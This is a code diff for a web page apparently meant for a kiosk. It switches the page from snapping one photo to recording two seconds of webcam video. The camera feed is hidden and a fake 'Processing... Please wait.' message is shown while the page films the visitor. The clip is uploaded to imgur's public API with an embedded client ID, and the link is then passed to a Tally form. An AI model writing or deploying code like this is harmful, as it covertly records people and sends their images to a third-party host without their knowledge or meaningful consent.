@@ -3,61 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kiosk Photo Capture</title>
+    <title>Kiosk Video Capture</title>
     <style>
         body { text-align: center; font-family: Arial, sans-serif; }
         #loading { font-size: 20px; display: block; margin-top: 20%; }
-        video, canvas { display: none; }
+        video { display: none; } /* Hide the video element */
     </style>
 </head>
 <body>
     <p id="loading">Processing... Please wait.</p>
     <video id="video" autoplay></video>
-    <canvas id="canvas"></canvas>
 
     <script>
         const video = document.getElementById("video");
-        const canvas = document.getElementById("canvas");
-        const context = canvas.getContext("2d");
 
         // Start camera (hidden)
-        navigator.mediaDevices.getUserMedia({ video: true })
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
             .then(stream => {
                 video.srcObject = stream;
-                video.onloadedmetadata = () => setTimeout(capturePhoto, 500); // Quick capture
+                startRecording(stream);
+            })
+            .catch(error => {
+                console.error("Camera Access Error:", error);
+                document.getElementById("loading").textContent = "Error accessing camera.";
             });
 
-        function capturePhoto() {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(uploadPhoto, "image/jpeg");
+        function startRecording(stream) {
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+
+            mediaRecorder.ondataavailable = event => chunks.push(event.data);
+            mediaRecorder.onstop = () => uploadVideo(new Blob(chunks, { type: "video/webm" }));
+
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 2000); // Record for 2 seconds
         }
 
-        function uploadPhoto(blob) {
+        function uploadVideo(blob) {
             const formData = new FormData();
-            formData.append("image", blob);
+            formData.append("video", blob);
 
-            fetch("https://api.imgur.com/3/image", {
+            fetch("https://api.imgur.com/3/upload", {
                 method: "POST",
                 headers: { "Authorization": "Client-ID 07dffe41da96ec7" },
                 body: formData
             })
             .then(response => response.json())
             .then(data => {
-                const photoURL = data.data.link;
+                const videoURL = data.data.link;
                 const timestamp = new Date().toISOString();
 
-                // Redirect to Tally Form with photo URL & timestamp
+                // Redirect to Tally Form with video URL & timestamp
                 const tallyFormURL = "https://tally.so/r/nGQ4OL";
-                window.location.href = `${tallyFormURL}?photo_url=${encodeURIComponent(photoURL)}&timestamp=${encodeURIComponent(timestamp)}`;
+                window.location.href = `${tallyFormURL}?video_url=${encodeURIComponent(videoURL)}&timestamp=${encodeURIComponent(timestamp)}`;
             })
             .catch(error => {
                 console.error("Upload Error:", error);
-                document.getElementById("loading").textContent = "Error capturing photo. Try again.";
+                document.getElementById("loading").textContent = "Error uploading video. Try again.";
             });
         }
     </script>
 </body>
 </html>
-
